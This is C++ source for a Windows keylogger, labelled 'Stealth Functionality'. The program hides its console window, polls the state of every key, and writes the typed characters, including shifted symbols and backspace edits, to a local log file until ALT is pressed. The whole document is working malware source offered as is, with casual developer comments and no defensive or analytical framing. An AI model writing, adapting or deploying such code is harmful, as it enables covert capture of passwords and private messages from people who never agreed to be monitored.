// KeyLogger Stealth Functionality

#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>

using namespace std;

bool isCapsOn = false;

template <class Text> // To pass in either string or char
void Save(Text key) {
	ofstream logfile;
	logfile.open("logfile.txt", ios::app); // forgot to add the append flag
	logfile << key; // Appends to logfile
	logfile.close();
}
void ClearKeyLogs() {
	ofstream logfile;
	logfile.open("logfile.txt");
	logfile.clear();
	logfile.close();
}
bool isKeyPressed(byte key) {
	return GetAsyncKeyState(key) == (short)0x8001; //Checks if a key is pressed.
}
bool isShiftBeingHeldDown() {
	return GetAsyncKeyState(VK_SHIFT) & (short)0x8000; // Checks if most significant bit is set. This means key is being held down
}
void deleteLastChar() {
	ifstream logfile;
	string temp, text = "";
	int size;
	logfile.open("logfile.txt");
	while (logfile.good()) {
		getline(logfile, temp);
		text += temp;
		if (logfile.good())
			text += '\n';
	}
	logfile.close();
	size = text.length();
	if (size > 0 && text[size - 1] != '\n') {
		text.pop_back();
		ClearKeyLogs();
		Save(text);
	}
}

bool isKeyListed(byte key) { // forgot to add caps lock
	switch (key) {
	case VK_CAPITAL:
		isCapsOn = !isCapsOn; // toggles capslock!!
		break;
	case VK_SPACE:
		Save(" ");
		break;
	case VK_RETURN:
		Save("\n");
		break;
	case VK_OEM_PERIOD:
		Save(".");
		break;
	case VK_OEM_COMMA:
	{
		if (!isShiftBeingHeldDown())
			Save(",");
		else
			Save("<");
		break;
	}
	case VK_TAB:
		Save("\t");
		break;
	case VK_CONTROL:
		Save("<CTRL>");
		break;
	case VK_BACK: // Backspace. We will have to rewrte teh whole logfile over.
	{
		deleteLastChar();
		break;
	}
	case VK_MENU: // Triggers to terminate the keylogging. (ALT key)
		Save("\nDone!!");
		exit(EXIT_SUCCESS);
	case VK_OEM_MINUS:
		Save('-');
		break;
	case 0xBF: // 128 + 32 + 16 + 8 + 4 + 2 + 1 = 1011 1111 = 191
	{
		if (isShiftBeingHeldDown())
			Save('?');
		else
			Save('/');
		break;
	}
	case 0xDE:
	{
		if (isShiftBeingHeldDown())
			Save("\"");
		else
			Save("'");
		break;
	}
	default: // If none of these keys were pressed. Returns false
		return false;
	}
	return true; // Otherwise return true
}
bool isKeyAlphabet(byte vKey) {
	return (65 <= vKey) && (vKey <= 90); //Big whoops
}
bool isKeyNumeric(byte vKey) {
	return (48 <= vKey) && (vKey <= 57);
}
void GetSymbol(const byte& numeric, byte& symbol) {
	switch (numeric) {
	case '1':
		symbol = '!';
		break;
	case '2':
		symbol = '@';
		break;
	case '3':
		symbol = '#';
		break;
	case '4':
		symbol = '$';
		break;
	case '5':
		symbol = '%';
		break;
	case '6':
		symbol = '^';
		break;
	case '7':
		symbol = '&';
		break;
	case '8':
		symbol = '*';
		break;
	case '9':
		symbol = '(';
		break;
	case '0':
		symbol = ')';
		break;
	}
}

// Now we can write main
int main()
{
	FreeConsole(); //Hides Window #StealthMode ^_^
	ClearKeyLogs(); // Clears Log File When KeyLogging First Starts

	byte key;
	while (true) {
		for (key = 0x8; key <= 0xFF; key++) {
			if (isKeyPressed(key)) {
				if (!isKeyListed(key)) {
					if (isKeyAlphabet(key)) {
						if (isShiftBeingHeldDown()) {
							if (!isCapsOn)
								Save(key); // Capital letters by default, when caps is not on
							else
								Save((byte)(key + 32)); // upper case char + 32 is lower case in ascii
						}
						else {
							if (!isCapsOn)
								Save((byte)(key + 32));
							else
								Save(key);
						}
					}
					else if (isKeyNumeric(key)) {
						if (isShiftBeingHeldDown()) {
							byte symbol;
							GetSymbol(key, symbol);
							Save(symbol);
						}
						else {
							Save(key);
						}
					}
					else {
						cout << (int)key << " ";
					}
				}
			}
		}
	}
	return 0;
}